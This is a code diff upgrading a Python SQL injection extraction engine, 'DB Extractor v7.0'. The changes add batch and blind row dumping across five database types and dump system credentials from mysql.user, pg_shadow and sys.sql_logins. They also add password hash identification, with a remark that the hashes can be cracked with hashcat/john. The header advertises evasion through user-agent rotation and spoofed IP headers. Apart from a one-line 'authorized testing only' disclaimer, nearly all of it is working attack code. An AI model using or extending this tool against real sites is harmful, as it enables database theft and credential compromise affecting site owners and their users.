@@ -1,5 +1,5 @@
 """
-DB Extractor v6.0 — UHQKYRA
+DB Extractor v7.0 — UHQKYRA
 =============================================================
 ⚠️  Authorized security testing only.
 
@@ -13,9 +13,9 @@ TECHNIQUES (in order of preference):
   4. Time-based   — SLEEP/WAITFOR/pg_sleep (last resort, slowest)
 
 DATABASES SUPPORTED:
-  • MySQL 5.x / 8.x (primary)
-  • PostgreSQL 9+ (CAST error, pg_sleep)
-  • MSSQL / SQL Server (CONVERT error, WAITFOR)
+  • MySQL 5.x / 8.x + MariaDB (primary — batch extraction)
+  • PostgreSQL 9+ (CAST error, pg_sleep, pg_shadow dump)
+  • MSSQL / SQL Server (CONVERT error, WAITFOR, sys.sql_logins dump)
   • SQLite (load_extension, sqlite_master)
   • Oracle (CTXSYS error, UTL_HTTP hint)
 
@@ -25,6 +25,15 @@ INJECTION VECTORS TESTED:
   • HTTP Headers: User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie values
   • JSON body fields
   • Stacked queries detection (timing-based confirmation)
+
+EXTRACTION FEATURES v7.0:
+  • Fixed separator collision bug — uses ASCII FS/GS (0x1c/0x1d) never in real data
+  • Non-MySQL multi-column: DB-native chr(28) concat per DB type
+  • Blind/time: per-column individual extraction (no separator needed)
+  • Row count check before dump — skips empty tables
+  • System credential extraction: mysql.user / pg_shadow / sys.sql_logins
+  • 25+ hash type identification (bcrypt, Argon2, PBKDF2-Django, LDAP, MSSQL...)
+  • cleartext + hashed credential detection side by side
 
 EVASION:
   • Per-request UA rotation + IP spoof headers
@@ -83,6 +92,15 @@ MARK_S = "S9S"
 MARK_E = "E9E"
 HEX_MS = "0x533953"
 HEX_ME = "0x453945"
+
+# ── Dump separators ── use ASCII control chars that NEVER appear in real data ──
+# \x1c = ASCII 28 (File Separator)  — column delimiter inside a row
+# \x1d = ASCII 29 (Group Separator) — row delimiter between rows
+# These are below printable ASCII (32–126) so they can't appear in passwords/emails/etc.
+COL_SEP_HEX  = "0x1c"    # MySQL hex literal → chr(28) byte
+ROW_SEP_HEX  = "0x1d"    # MySQL hex literal → chr(29) byte
+COL_SEP_CHAR = "\x1c"    # Python string for splitting
+ROW_SEP_CHAR = "\x1d"    # Python string for splitting
 
 # SQL error patterns (multi-DB)
 SQL_ERROR_PATTERNS = [
@@ -197,26 +215,59 @@ INJECTABLE_HEADERS = [
 # ─── Hash identification ──────────────────────────────────────────────────────
 
 def _identify_hash(val):
-    """Identify common password hash types"""
+    """Identify common password hash types — supports 25+ formats"""
     if not val:
         return None
     val = val.strip()
+    # ── Modular crypt format ──────────────────────────────────────────────────
     if re.match(r'^\$2[aby]\$\d{2}\$', val):
         return "bcrypt"
+    if re.match(r'^\$argon2(id?|i)\$', val):
+        return "Argon2"
     if re.match(r'^\$P\$', val):
-        return "WordPress (phpass)"
+        return "WordPress phpass"
+    if re.match(r'^\$H\$', val):
+        return "phpBB3 phpass"
+    if re.match(r'^\$S\$', val):
+        return "Drupal SHA-512"
     if re.match(r'^\$1\$', val):
         return "MD5-crypt"
     if re.match(r'^\$6\$', val):
-        return "SHA-512 crypt"
+        return "SHA-512-crypt"
     if re.match(r'^\$5\$', val):
-        return "SHA-256 crypt"
+        return "SHA-256-crypt"
     if re.match(r'^\$apr1\$', val):
         return "Apache MD5"
+    if re.match(r'^\$y\$', val):
+        return "yescrypt"
+    # ── Django / PBKDF2 ───────────────────────────────────────────────────────
+    if re.match(r'^pbkdf2_sha(256|512)\$', val, re.I):
+        return "PBKDF2 (Django)"
+    if re.match(r'^sha1\$', val):
+        return "SHA-1 (Django)"
+    if re.match(r'^md5\$', val):
+        return "MD5 (Django)"
+    if re.match(r'^bcrypt\$\$2[aby]', val):
+        return "bcrypt (Django)"
+    # ── LDAP ─────────────────────────────────────────────────────────────────
+    if re.match(r'^\{SSHA\}', val, re.I):
+        return "SSHA (LDAP)"
+    if re.match(r'^\{SHA\}', val, re.I):
+        return "SHA-1 (LDAP)"
+    if re.match(r'^\{MD5\}', val, re.I):
+        return "MD5 (LDAP)"
+    if re.match(r'^\{CRYPT\}', val, re.I):
+        return "crypt (LDAP)"
+    # ── MySQL ─────────────────────────────────────────────────────────────────
     if re.match(r'^\*[0-9A-F]{40}$', val):
         return "MySQL SHA1"
+    if re.match(r'^[0-9a-f]{16}$', val, re.I):
+        return "MySQL OLD (DES)"
+    # ── Raw hex hashes ────────────────────────────────────────────────────────
     if re.match(r'^[0-9a-f]{128}$', val, re.I):
         return "SHA-512"
+    if re.match(r'^[0-9a-f]{96}$', val, re.I):
+        return "SHA-384"
     if re.match(r'^[0-9a-f]{64}$', val, re.I):
         return "SHA-256"
     if re.match(r'^[0-9a-f]{56}$', val, re.I):
@@ -225,14 +276,20 @@ def _identify_hash(val):
         return "SHA-1"
     if re.match(r'^[0-9a-f]{32}$', val, re.I):
         return "MD5"
-    if re.match(r'^[0-9a-f]{16}$', val, re.I):
-        return "MySQL OLD"
-    if re.match(r'^[A-Za-z0-9+/]{43}=$', val):
-        return "SHA-256 base64"
-    if re.match(r'^[A-Za-z0-9+/]{60}={0,2}$', val):
-        return "SHA-384 base64"
+    # ── Base64-encoded ────────────────────────────────────────────────────────
     if re.match(r'^[A-Za-z0-9+/]{86}={0,2}$', val):
-        return "SHA-512 base64"
+        return "SHA-512 (base64)"
+    if re.match(r'^[A-Za-z0-9+/]{60}={0,2}$', val):
+        return "SHA-384 (base64)"
+    if re.match(r'^[A-Za-z0-9+/]{43}=$', val):
+        return "SHA-256 (base64)"
+    if re.match(r'^[A-Za-z0-9+/]{27}=$', val):
+        return "MD5 (base64)"
+    # ── MSSQL ─────────────────────────────────────────────────────────────────
+    if re.match(r'^0x0200[0-9A-F]+$', val, re.I) and len(val) == 54:
+        return "MSSQL 2012+ (SHA-512)"
+    if re.match(r'^0x0100[0-9A-F]+$', val, re.I) and len(val) == 54:
+        return "MSSQL 2000 (SHA-1)"
     return None
 
 
@@ -318,7 +375,7 @@ def _content_differs(r1, r2, threshold=0.04):
 
 class SQLInjector:
     """
-    Professional SQL Injection detection + extraction engine v6.0.
+    Professional SQL Injection detection + extraction engine v7.0.
 
     Usage:
         inj = SQLInjector("http://target.com/page.php?id=1", callback=cb)
@@ -1258,58 +1315,285 @@ class SQLInjector:
         self._cb("found", f"🗄️ Colonnes de '{table}': {', '.join(cols[:20])}")
         return cols
 
-    # ── Table dump ────────────────────────────────────────────────────────────
-    def dump_table(self, table, columns, limit=50):
-        """Dump rows from a table with hash detection"""
-        self._cb("info", f"🗄️ Dump '{table}' ({', '.join(columns[:5])})... [limit={limit}]")
-        rows = []
-        safe_cols = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
-        if not safe_cols:
-            return rows
-
-        if self.db_type == "MySQL":
-            parts      = [f"IFNULL({c},0x4e554c4c)" for c in safe_cols]
-            concat_row = f"CONCAT_WS(0x3b3b,{','.join(parts)})"
-            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR 0x7c7c7c7c) "
-                   f"FROM (SELECT {','.join(safe_cols)} FROM `{table}` LIMIT {limit}) t__")
+    # ── Row count helper ──────────────────────────────────────────────────────
+    def _count_table_rows(self, table):
+        """Get row count before dump — prevents wasted extraction on empty tables"""
+        safe = re.sub(r'[^a-zA-Z0-9_]', '', table)
+        if not safe:
+            return None
+        try:
+            if self.db_type == "MySQL":
+                sql = f"SELECT COUNT(*) FROM `{safe}`"
+            elif self.db_type == "PostgreSQL":
+                sql = f'SELECT COUNT(*) FROM "{safe}"'
+            elif self.db_type == "MSSQL":
+                sql = f"SELECT COUNT(*) FROM [{safe}]"
+            elif self.db_type == "SQLite":
+                sql = f"SELECT COUNT(*) FROM '{safe}'"
+            elif self.db_type == "Oracle":
+                sql = f"SELECT COUNT(*) FROM {safe.upper()}"
+            else:
+                sql = f"SELECT COUNT(*) FROM `{safe}`"
             raw = self.query(sql)
             if raw:
-                for row_str in re.split(r'\|\|\|\|', raw):
-                    parts_r = row_str.split(";;")
-                    if any(p.strip() for p in parts_r):
-                        row = dict(zip(safe_cols, [p.strip() for p in parts_r[:len(safe_cols)]]))
-                        rows.append(row)
-                        # Detect and flag hashes
-                        for col, val in row.items():
-                            htype = _identify_hash(str(val or ""))
-                            if htype:
-                                self._cb("vuln", f"🔑 Hash {htype} dans {table}.{col}: {str(val)[:60]}")
+                m = re.search(r'\d+', raw.strip())
+                if m:
+                    return int(m.group())
+        except Exception:
+            pass
+        return None
+
+    # ── Table dump ────────────────────────────────────────────────────────────
+    def dump_table(self, table, columns, limit=50):
+        """
+        Dump rows — fixed separator collisions, correct multi-col extraction.
+        Uses ASCII FS/GS (0x1c/0x1d) as separators — never appear in real data.
+        Blind/time-based: extracts each column individually to avoid separator issues.
+        """
+        safe_cols = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
+        if not safe_cols:
+            return []
+
+        # Check row count first — skip empty tables
+        count = self._count_table_rows(table)
+        if count is not None:
+            if count == 0:
+                self._cb("info", f"🗄️ Table '{table}' vide (0 lignes)")
+                return []
+            actual_limit = min(limit, count)
+            self._cb("info", f"🗄️ Dump '{table}' — {count} ligne(s) au total, extraction: {actual_limit}")
         else:
-            # Row-by-row for other DBs
-            for offset in range(limit):
-                if self.db_type == "PostgreSQL":
-                    sql = f"SELECT {','.join(safe_cols)} FROM {table} LIMIT 1 OFFSET {offset}"
-                elif self.db_type == "MSSQL":
-                    sql = (f"SELECT TOP 1 {','.join(safe_cols)} FROM {table} "
-                           f"ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
-                elif self.db_type == "Oracle":
-                    sql = (f"SELECT {','.join(safe_cols)} FROM "
-                           f"(SELECT {','.join(safe_cols)},ROWNUM rn__ FROM {table}) "
-                           f"WHERE rn__={offset+1}")
-                else:
-                    sql = f"SELECT {','.join(safe_cols)} FROM {table} LIMIT 1 OFFSET {offset}"
-                row_raw = self.query(sql)
-                if not row_raw:
-                    break
-                row = dict(zip(safe_cols, row_raw.split("||")[:len(safe_cols)]))
-                rows.append(row)
-                for col, val in row.items():
-                    htype = _identify_hash(str(val or ""))
+            actual_limit = limit
+            self._cb("info", f"🗄️ Dump '{table}' ({', '.join(safe_cols[:5])})... [limit={limit}]")
+
+        rows = []
+
+        # Helper: detect + report hashes in a row
+        def _check_hashes(row_dict):
+            for col, val in row_dict.items():
+                if val and str(val).strip() not in ("", "NULL"):
+                    htype = _identify_hash(str(val))
                     if htype:
                         self._cb("vuln", f"🔑 Hash {htype} dans {table}.{col}: {str(val)[:60]}")
 
+        # ── MySQL: batch extraction with ASCII control-char separators ────────
+        if self.db_type == "MySQL" and self.technique not in ("blind", "time"):
+            # COL_SEP=0x1c (FS, ASCII 28), ROW_SEP=0x1d (GS, ASCII 29)
+            # These bytes CANNOT appear in usernames, emails, or passwords
+            parts      = [f"IFNULL({c},0x4e554c4c)" for c in safe_cols]
+            concat_row = f"CONCAT_WS({COL_SEP_HEX},{','.join(parts)})"
+            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR {ROW_SEP_HEX}) "
+                   f"FROM (SELECT {','.join(safe_cols)} FROM `{table}` LIMIT {actual_limit}) t__")
+            raw = self.query(sql)
+            if raw:
+                for row_str in raw.split(ROW_SEP_CHAR):
+                    if not row_str:
+                        continue
+                    parts_r = row_str.split(COL_SEP_CHAR)
+                    row = {}
+                    for col, val in zip(safe_cols, parts_r[:len(safe_cols)]):
+                        v = val.strip()
+                        row[col] = None if (not v or v == "NULL") else v
+                    if any(v for v in row.values()):
+                        rows.append(row)
+                        _check_hashes(row)
+
+        # ── Non-MySQL (error/union): concat all cols per row with chr(28) ─────
+        elif self.db_type != "MySQL" and self.technique not in ("blind", "time"):
+            for offset in range(actual_limit):
+                if self.db_type == "PostgreSQL":
+                    concat_parts = [f"COALESCE(CAST({c} AS TEXT),'')" for c in safe_cols]
+                    concat_expr  = " || chr(28) || ".join(concat_parts)
+                    sql = f"SELECT {concat_expr} FROM {table} LIMIT 1 OFFSET {offset}"
+
+                elif self.db_type == "MSSQL":
+                    concat_parts = [f"ISNULL(CAST({c} AS NVARCHAR(MAX)),'')" for c in safe_cols]
+                    concat_expr  = " + CHAR(28) + ".join(concat_parts)
+                    sql = (f"SELECT TOP 1 {concat_expr} FROM {table} "
+                           f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
+
+                elif self.db_type == "SQLite":
+                    concat_parts = [f"IFNULL(CAST({c} AS TEXT),'')" for c in safe_cols]
+                    concat_expr  = " || char(28) || ".join(concat_parts)
+                    sql = f"SELECT {concat_expr} FROM '{table}' LIMIT 1 OFFSET {offset}"
+
+                elif self.db_type == "Oracle":
+                    # Oracle: inner query exposes raw cols, outer applies concat
+                    inner_cols   = ", ".join(safe_cols)
+                    concat_parts = [f"NVL(TO_CHAR({c}),'')" for c in safe_cols]
+                    concat_expr  = " || chr(28) || ".join(concat_parts)
+                    sql = (f"SELECT {concat_expr} FROM "
+                           f"(SELECT {inner_cols}, ROWNUM rn__ FROM {table} WHERE ROWNUM <= {offset+1}) "
+                           f"WHERE rn__ = {offset+1}")
+
+                else:
+                    # Generic MySQL-compatible fallback
+                    concat_parts = [f"IFNULL(CAST({c} AS CHAR),'')" for c in safe_cols]
+                    concat_expr  = f"CONCAT_WS({COL_SEP_HEX},{','.join(concat_parts)})"
+                    sql = f"SELECT {concat_expr} FROM `{table}` LIMIT 1 OFFSET {offset}"
+
+                row_raw = self.query(sql)
+                if not row_raw:
+                    break
+                parts_r = row_raw.split(COL_SEP_CHAR)
+                row = {}
+                for col, val in zip(safe_cols, parts_r[:len(safe_cols)]):
+                    v = val.strip() if val else ""
+                    row[col] = None if (not v or v == "NULL") else v
+                if not any(v for v in row.values()):
+                    break  # All nulls = past end of table
+                rows.append(row)
+                _check_hashes(row)
+
+        # ── Blind / time-based: one column per query (accurate, slower) ───────
+        else:
+            for offset in range(actual_limit):
+                row = {}
+                any_val = False
+                for col in safe_cols:
+                    if self.db_type == "MySQL":
+                        sql = f"SELECT IFNULL(`{col}`,'') FROM `{table}` LIMIT 1 OFFSET {offset}"
+                    elif self.db_type == "PostgreSQL":
+                        sql = f"SELECT COALESCE(CAST({col} AS TEXT),'') FROM {table} LIMIT 1 OFFSET {offset}"
+                    elif self.db_type == "MSSQL":
+                        sql = (f"SELECT ISNULL(CAST({col} AS NVARCHAR(MAX)),'') FROM {table} "
+                               f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
+                    elif self.db_type == "SQLite":
+                        sql = f"SELECT IFNULL(CAST({col} AS TEXT),'') FROM '{table}' LIMIT 1 OFFSET {offset}"
+                    elif self.db_type == "Oracle":
+                        sql = (f"SELECT NVL(TO_CHAR({col}),'') FROM "
+                               f"(SELECT {col}, ROWNUM rn__ FROM {table} WHERE ROWNUM <= {offset+1}) "
+                               f"WHERE rn__ = {offset+1}")
+                    else:
+                        sql = f"SELECT IFNULL(`{col}`,'') FROM `{table}` LIMIT 1 OFFSET {offset}"
+                    val = self.query(sql)
+                    if val and val.strip() and val.strip() not in ("NULL", ""):
+                        row[col] = val.strip()
+                        any_val = True
+                    else:
+                        row[col] = None
+                if not any_val:
+                    break
+                rows.append(row)
+                _check_hashes(row)
+
         self._cb("found", f"🗄️ {len(rows)} ligne(s) extraite(s) de '{table}'")
         return rows
+
+    # ── MySQL system user dump ────────────────────────────────────────────────
+    def _dump_mysql_users(self):
+        """Dump mysql.user — requires DBA or FILE privilege. Graceful fail if denied."""
+        self._cb("info", "🗄️ Tentative d'extraction mysql.user (comptes système)...")
+        results = []
+        # Try MySQL 8.x first (authentication_string), then 5.x (Password + auth_string)
+        queries = [
+            # MySQL 8.x / MariaDB
+            (f"SELECT GROUP_CONCAT(CONCAT_WS({COL_SEP_HEX},User,Host,authentication_string) "
+             f"ORDER BY User SEPARATOR {ROW_SEP_HEX}) FROM mysql.`user`"),
+            # MySQL 5.x fallback
+            (f"SELECT GROUP_CONCAT(CONCAT_WS({COL_SEP_HEX},User,Host,Password,authentication_string) "
+             f"ORDER BY User SEPARATOR {ROW_SEP_HEX}) FROM mysql.`user`"),
+        ]
+        for sql in queries:
+            raw = self.query(sql)
+            if not raw or not raw.strip() or raw.strip() in ("NULL", ""):
+                continue
+            for row_str in raw.split(ROW_SEP_CHAR):
+                if not row_str.strip():
+                    continue
+                parts = row_str.split(COL_SEP_CHAR)
+                user = parts[0].strip() if parts else ""
+                host = parts[1].strip() if len(parts) > 1 else "%"
+                # Pick first non-empty password field
+                pw = ""
+                for p in parts[2:]:
+                    if p.strip() and p.strip() not in ("NULL", ""):
+                        pw = p.strip()
+                        break
+                if not user:
+                    continue
+                htype = _identify_hash(pw) if pw else None
+                display = f"{user}@{host}"
+                results.append({
+                    "username": display,
+                    "password": pw or None,
+                    "hash_type": htype,
+                    "table": "mysql.user"
+                })
+                msg = f"🔑 mysql.user: {display} — {pw[:60] if pw else '(no password)'}"
+                if htype:
+                    msg += f" [{htype}]"
+                self._cb("vuln", msg)
+            if results:
+                break  # Got data from first working query
+        if results:
+            self._cb("vuln", f"🚨 {len(results)} compte(s) MySQL système extraits!")
+        return results
+
+    # ── PostgreSQL system user dump ───────────────────────────────────────────
+    def _dump_pg_shadow(self):
+        """Dump pg_shadow — requires superuser. Graceful fail if denied."""
+        self._cb("info", "🗄️ Tentative d'extraction pg_shadow (PostgreSQL)...")
+        results = []
+        sql = (f"SELECT string_agg(usename || chr(28) || COALESCE(passwd,'') || chr(28) || "
+               f"CASE WHEN usesuper THEN 'superuser' ELSE 'user' END, chr(29)) "
+               f"FROM pg_shadow")
+        raw = self.query(sql)
+        if not raw or not raw.strip():
+            return results
+        for row_str in raw.split(ROW_SEP_CHAR):
+            parts = row_str.split(COL_SEP_CHAR)
+            user  = parts[0].strip() if parts else ""
+            pw    = parts[1].strip() if len(parts) > 1 else ""
+            role  = parts[2].strip() if len(parts) > 2 else ""
+            if not user:
+                continue
+            htype = _identify_hash(pw) if pw else None
+            display = user + (" (superuser)" if role == "superuser" else "")
+            results.append({
+                "username": display,
+                "password": pw or None,
+                "hash_type": htype or ("PostgreSQL MD5" if pw.startswith("md5") else None),
+                "table": "pg_shadow"
+            })
+            msg = f"🔑 pg_shadow: {display} — {pw[:60] if pw else '(no hash)'}"
+            if htype:
+                msg += f" [{htype}]"
+            self._cb("vuln", msg)
+        if results:
+            self._cb("vuln", f"🚨 {len(results)} compte(s) PostgreSQL extraits!")
+        return results
+
+    # ── MSSQL system login dump ───────────────────────────────────────────────
+    def _dump_mssql_logins(self):
+        """Dump sys.sql_logins — requires sysadmin. Graceful fail if denied."""
+        self._cb("info", "🗄️ Tentative d'extraction sys.sql_logins (MSSQL)...")
+        results = []
+        sql = ("SELECT STUFF((SELECT CHAR(29)+name+CHAR(28)+"
+               "ISNULL(CONVERT(NVARCHAR(MAX),password_hash,2),'')+CHAR(28)+"
+               "CASE is_disabled WHEN 1 THEN 'disabled' ELSE "
+               "CASE IS_SRVROLEMEMBER('sysadmin',name) WHEN 1 THEN 'sysadmin' ELSE 'user' END END "
+               "FROM sys.sql_logins ORDER BY name FOR XML PATH('')),1,1,'')")
+        raw = self.query(sql)
+        if not raw or not raw.strip():
+            return results
+        for row_str in raw.split(ROW_SEP_CHAR):
+            parts = row_str.split(COL_SEP_CHAR)
+            user  = parts[0].strip() if parts else ""
+            pw    = parts[1].strip() if len(parts) > 1 else ""
+            role  = parts[2].strip() if len(parts) > 2 else ""
+            if not user:
+                continue
+            results.append({
+                "username": user + (f" ({role})" if role in ("sysadmin", "disabled") else ""),
+                "password": pw or None,
+                "hash_type": "MSSQL hash" if pw else None,
+                "table": "sys.sql_logins"
+            })
+            self._cb("vuln", f"🔑 sys.sql_logins: {user} ({role}) — {pw[:60] if pw else '(no hash)'}")
+        if results:
+            self._cb("vuln", f"🚨 {len(results)} compte(s) MSSQL extraits!")
+        return results
 
     # ── Smart credential extraction ───────────────────────────────────────────
     def extract_credentials(self):
@@ -1388,8 +1672,35 @@ class SQLInjector:
         if creds_found:
             self._cb("vuln", f"🚨 {len(creds_found)} paire(s) identifiants extraites!")
 
+        # ── System DB accounts (elevated privilege required — graceful fail) ──
+        sys_creds = []
+        try:
+            if self.db_type == "MySQL":
+                sys_creds = self._dump_mysql_users()
+            elif self.db_type == "PostgreSQL":
+                sys_creds = self._dump_pg_shadow()
+            elif self.db_type == "MSSQL":
+                sys_creds = self._dump_mssql_logins()
+        except Exception:
+            pass  # No privilege — silently skip
+
+        for sc in sys_creds:
+            htype = sc.get("hash_type")
+            pw    = sc.get("password")
+            if pw and htype:
+                hashes_found.append({
+                    "user":  sc["username"],
+                    "hash":  pw,
+                    "type":  htype,
+                    "table": sc["table"],
+                })
+            # Avoid duplicates
+            if sc not in creds_found:
+                creds_found.append(sc)
+
         results["_creds_summary"] = creds_found
         results["_hashes"]        = hashes_found
+        results["_sys_creds"]     = sys_creds
         return results
 
 
@@ -1423,7 +1734,7 @@ def full_db_extraction(url, param=None, mode="enum", target_table=None,
         cb("warn", "🗄️ requests non disponible")
         return results
 
-    cb("info", f"🗄️ SQLi v6.0 — {url}")
+    cb("info", f"🗄️ SQLi v7.0 — {url}")
 
     inj = SQLInjector(url, param=param, method=method,
                       post_data=post_data or {}, cookies=cookies or {},
@@ -1475,12 +1786,33 @@ def full_db_extraction(url, param=None, mode="enum", target_table=None,
     if mode == "creds":
         results["credentials"] = inj.extract_credentials()
         cred_summary = results["credentials"].get("_creds_summary", [])
+        sys_creds    = results["credentials"].get("_sys_creds", [])
+        hashes       = results["credentials"].get("_hashes", [])
+
         if cred_summary:
+            tables_hit = sorted(set(c.get("table","?") for c in cred_summary))
             results["vulnerabilities"].append({
-                "type": "credential_exposure", "severity": "critical",
-                "name": f"Credentials exposés: {len(cred_summary)} compte(s)",
-                "detail": f"Tables: {', '.join(set(c['table'] for c in cred_summary))}",
+                "type":     "credential_exposure",
+                "severity": "critical",
+                "name":     f"Credentials exposés: {len(cred_summary)} compte(s)",
+                "detail":   f"Tables: {', '.join(tables_hit)}",
             })
+        if sys_creds:
+            results["vulnerabilities"].append({
+                "type":     "system_credential_exposure",
+                "severity": "critical",
+                "name":     f"Comptes système DB exposés: {len(sys_creds)}",
+                "detail":   "mysql.user / pg_shadow / sys.sql_logins — accès root DB",
+            })
+        if hashes:
+            hash_types = sorted(set(h.get("type","?") for h in hashes if h.get("type")))
+            if hash_types:
+                results["vulnerabilities"].append({
+                    "type":     "password_hash_exposure",
+                    "severity": "high",
+                    "name":     f"{len(hashes)} hash(s) de mot de passe extraits",
+                    "detail":   f"Types: {', '.join(hash_types)} — crackable avec hashcat/john",
+                })
         return results
 
     # Step 7: Full dump (dump mode)
